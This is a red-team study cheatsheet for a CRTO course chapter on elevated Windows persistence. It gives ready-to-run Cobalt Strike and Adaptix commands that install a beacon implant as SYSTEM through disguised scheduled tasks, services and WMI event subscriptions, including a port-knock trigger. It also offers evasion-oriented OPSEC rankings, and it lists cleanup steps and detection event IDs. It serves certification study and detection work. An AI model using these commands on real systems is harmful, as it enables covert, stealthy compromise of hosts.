# Cheatsheet: Persistence (Elevated)

*CRTO Study — Juan | Chapter 10: Elevated Persistence*

---

## Overview

Once elevated access is obtained, establish a second persistence layer to survive patching/mitigation of the initial elevation vector. All techniques here require admin/SYSTEM context.

**Prefer disk-less or low-footprint methods — OPSEC score counts.**

---

## OPSEC Quick Reference

| Technique | OPSEC | Disk Artifact | Survives Reboot |
|-----------|-------|---------------|-----------------|
| WMI Persistent Event (CmdLine consumer) | CAUTION | WMI repository (not disk file) | Yes |
| WMI Remote Trigger (firewall drop) | CAUTION | WMI repository | Yes |
| Scheduled Task (XML/schtasks) | CAUTION | Task XML in `C:\Windows\System32\Tasks\` | Yes |
| Windows Service (sc create) | UNSAFE | Service binary on disk | Yes |
| Golden/Diamond Ticket | SAFE | None | Until krbtgt rotation |

---

## 1 — Scheduled Tasks

The Task Scheduler can execute payloads as SYSTEM on a trigger (boot, logon, time, event).

### CS — OPSEC-CAUTION

```
# Via SharPersist (execute-assembly — fork & run)
beacon> execute-assembly SharPersist.exe -t schtask -c "C:\Windows\Temp\beacon.exe" -n "WindowsUpdate" -m add -o logon

# Via native schtasks (OPSEC-UNSAFE — spawns cmd.exe)
beacon> shell schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\Temp\beacon.exe" /sc onstart /ru SYSTEM /f

# Via PowerShell task XML (OPSEC-CAUTION — no cmd.exe spawn)
beacon> powerpick $action = New-ScheduledTaskAction -Execute 'C:\Windows\Temp\beacon.exe'; $trigger = New-ScheduledTaskTrigger -AtStartup; Register-ScheduledTask -TaskName 'WindowsUpdate' -Action $action -Trigger $trigger -RunLevel Highest -User 'SYSTEM' -Force

# Verify
beacon> shell schtasks /query /tn "WindowsUpdate" /fo LIST /v
```

### Adaptix Equivalent

```
# Via execute-assembly
agent> execute-assembly SharPersist.exe -t schtask -c "C:\Windows\Temp\beacon.exe" -n "WindowsUpdate" -m add -o logon

# Via PowerShell BOF / powerpick equivalent
agent> powershell $action = New-ScheduledTaskAction -Execute 'C:\Windows\Temp\beacon.exe'; Register-ScheduledTask ...
```

### Cleanup

```
beacon> shell schtasks /delete /tn "WindowsUpdate" /f
```

### Detection Footprint

- Event ID **4698** — Scheduled task created
- Event ID **4702** — Scheduled task updated
- Task XML written to `C:\Windows\System32\Tasks\<name>`
- Sysmon Event ID **11** (file create) on task XML path

---

## 2 — Windows Services

Creates a persistent service that runs a payload as SYSTEM at boot.

### CS — OPSEC-UNSAFE (service binary written to disk)

```
# Native sc.exe (OPSEC-UNSAFE — spawns cmd.exe + writes service)
beacon> shell sc create "SvcUpdate" binpath= "C:\Windows\Temp\beacon.exe" start= auto
beacon> shell sc description "SvcUpdate" "Windows Update Helper"
beacon> shell sc start "SvcUpdate"

# Via SharPersist (execute-assembly — slightly less noisy)
beacon> execute-assembly SharPersist.exe -t service -c "C:\Windows\Temp\beacon.exe" -n "SvcUpdate" -m add

# Verify
beacon> shell sc qc SvcUpdate
```

### Adaptix Equivalent

```
agent> execute-assembly SharPersist.exe -t service -c "C:\Windows\Temp\beacon.exe" -n "SvcUpdate" -m add
agent> shell sc qc SvcUpdate
```

### Cleanup

```
beacon> shell sc stop SvcUpdate
beacon> shell sc delete SvcUpdate
```

### Detection Footprint

- Event ID **7045** — New service installed (System log) — **high-fidelity alert**
- Event ID **4697** — Service installed (Security log, if auditing enabled)
- Sysmon Event ID **13** (registry value set) — `HKLM\SYSTEM\CurrentControlSet\Services\`
- Service binary written to disk — scan target

---

## 3 — WMI Persistence (Eventing)

WMI persistent events survive reboots, run as SYSTEM, and store in the WMI repository (not a file on disk). Three components required:

| Component | Purpose |
|-----------|---------|
| **Event Filter** | WQL query defining the trigger condition |
| **Event Consumer** | Action to take when filter matches |
| **Filter-to-Consumer Binding** | Links filter to consumer |

### Query Types Reference

```powershell
# Instance Query — snapshot (SELECT * FROM Win32_Process WHERE Name = 'notepad.exe')
# Event Query — future trigger (SELECT * FROM __InstanceCreationEvent WITHIN 5
#                               WHERE TargetInstance ISA 'Win32_Process'
#                               AND TargetInstance.Name = 'notepad.exe')
```

### Persistent Event — CommandLineEventConsumer

**Trigger:** fires when a specific process launches (or any WMI-observable event).

```powershell
# PowerShell — via powerpick (OPSEC-CAUTION — no powershell.exe spawn)

# 1. Event Filter
beacon> powerpick $filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments @{Name='UpdateFilter'; EventNamespace='root/cimv2'; QueryLanguage='WQL'; Query="SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'svchost.exe'"}

# 2. CommandLine Event Consumer (executes payload)
beacon> powerpick $consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments @{Name='UpdateConsumer'; CommandLineTemplate='C:\Windows\Temp\beacon.exe'}

# 3. Filter-to-Consumer Binding
beacon> powerpick Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$filter; Consumer=$consumer}
```

### Persistent Event — Win32_NTLogEvent (Event ID trigger)

**Trigger:** Event ID 4800 = workstation locked (user walks away).

```powershell
beacon> powerpick $filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments @{Name='LockFilter'; EventNamespace='root/cimv2'; QueryLanguage='WQL'; Query="SELECT * FROM __InstanceModificationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_LogonSession'"}
# Use Win32_NTLogEvent for standard log events (Application/Security/System)
```

### Remote Trigger (Firewall Drop — Port Knock)

**Concept:** enable "Audit Filtering Platform Packet Drop" → Event ID 5152 fires on dropped packets → filter on specific port → payload executes when attacker knocks on that port.

```powershell
# Enable audit policy (requires SYSTEM)
beacon> shell auditpol /set /subcategory:"Filtering Platform Packet Drop" /success:enable /failure:enable

# Event filter — fires when firewall drops a packet for port 4444
beacon> powerpick $filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments @{Name='PortKnock'; EventNamespace='root/cimv2'; QueryLanguage='WQL'; Query="SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_NTLogEvent' AND TargetInstance.LogFile='Security' AND TargetInstance.EventCode=5152 AND TargetInstance.Message LIKE '%4444%'"}

# Bind to consumer as above
```

### CS via SharpWMI (execute-assembly)

```
beacon> execute-assembly SharpWMI.exe action=install-persist name=UpdateFilter query="SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name='svchost.exe'" command="C:\Windows\Temp\beacon.exe"
```

### Adaptix Equivalent

```
# Via execute-assembly BOF / SharpWMI
agent> execute-assembly SharpWMI.exe action=install-persist name=UpdateFilter query="SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name='svchost.exe'" command="C:\Windows\Temp\beacon.exe"

# Via PowerShell
agent> powershell Set-WmiInstance -Namespace root/subscription -Class __EventFilter ...
```

### Enumerate / Verify WMI Persistence

```powershell
beacon> powerpick Get-WmiObject -Namespace root/subscription -Class __EventFilter
beacon> powerpick Get-WmiObject -Namespace root/subscription -Class __EventConsumer
beacon> powerpick Get-WmiObject -Namespace root/subscription -Class __FilterToConsumerBinding
```

### Cleanup

```powershell
beacon> powerpick Get-WmiObject -Namespace root/subscription -Class __EventFilter | Where-Object {$_.Name -eq 'UpdateFilter'} | Remove-WmiObject
beacon> powerpick Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer | Where-Object {$_.Name -eq 'UpdateConsumer'} | Remove-WmiObject
beacon> powerpick Get-WmiObject -Namespace root/subscription -Class __FilterToConsumerBinding | Remove-WmiObject
```

### Detection Footprint

- Event ID **5861** — New WMI activity registered (WMI-Activity/Operational log)
- WMI repository modified: `C:\Windows\System32\wbem\Repository\`
- Sysmon Event ID **19/20/21** — WMI filter, consumer, and binding creation
- No disk binary for the persistence mechanism itself — payload binary still on disk

---

## Comparison: CS vs Adaptix

| Capability | Cobalt Strike | Adaptix |
|-----------|--------------|---------|
| Sched task (SharPersist) | `execute-assembly SharPersist.exe -t schtask` | `execute-assembly SharPersist.exe -t schtask` |
| Service (SharPersist) | `execute-assembly SharPersist.exe -t service` | `execute-assembly SharPersist.exe -t service` |
| WMI event (SharpWMI) | `execute-assembly SharpWMI.exe action=install-persist` | `execute-assembly SharpWMI.exe action=install-persist` |
| WMI via PowerShell | `powerpick Set-WmiInstance ...` | `powershell Set-WmiInstance ...` |
| Native service (noisy) | `shell sc create ...` | `shell sc create ...` |
| Native schtask (noisy) | `shell schtasks /create ...` | `shell schtasks /create ...` |

---

## OPSEC Decision Tree

```
Need elevated persistence?
├─ Prefer disk-less?
│   └─ Yes → Golden/Diamond Ticket (best — no footprint)
│                WMI Persistent Event (no binary on disk — WMI repo only)
└─ Disk artifact acceptable?
    ├─ Scheduled Task → CAUTION (task XML in Tasks\, Event 4698)
    └─ Windows Service → UNSAFE (Event 7045 = high-fidelity alert, avoid in exam)
```

**Exam preference order:** Golden Ticket > WMI Event > Scheduled Task > Service (last resort)

---

*Source: ZPS CRTO Course — Chapter 10: Elevated Persistence*
*Last updated: 2026-04-10*
